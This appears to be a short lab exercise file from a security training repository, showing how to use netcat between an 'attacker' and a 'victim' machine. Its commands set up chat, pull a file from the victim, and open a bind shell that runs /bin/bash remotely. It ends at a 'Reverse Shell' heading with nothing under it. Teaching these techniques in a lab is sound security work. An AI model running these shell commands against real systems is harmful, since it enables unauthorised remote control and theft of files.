# Exercise: netcat (nc)


## Setup

The default `netcat that comes with AWS does not support the `netcat -e /bin/bash` option. For now, `exercises/aws/bin/{netcat,nc} is used. It came from Kali Linux.

```bash
HOST=Attacker's machine IP
RHOST=Victim's machine IP
PORT=4444
```

*Note: We use HOST/RHOST to stay align with naming conventions in Metasploit*

## Bind Shells

### Chat

```bash
# Victim's machine
nc -lvp $PORT

# Attacker's machine
nc $RHOST $PORT
```

### File Transfers

```bash
# Victim's machine
nc -lvp $PORT < foo.zip

# Attacker's machine
nc $RHOST $PORT > foo.zip
```

### Remote Code Execution

```bash
# Victim's machine
nc -lvp $PORT -e /bin/bash

# Attacker's machine
nc $RHOST $PORT
# run commands remotely here
```

## Reverse Shell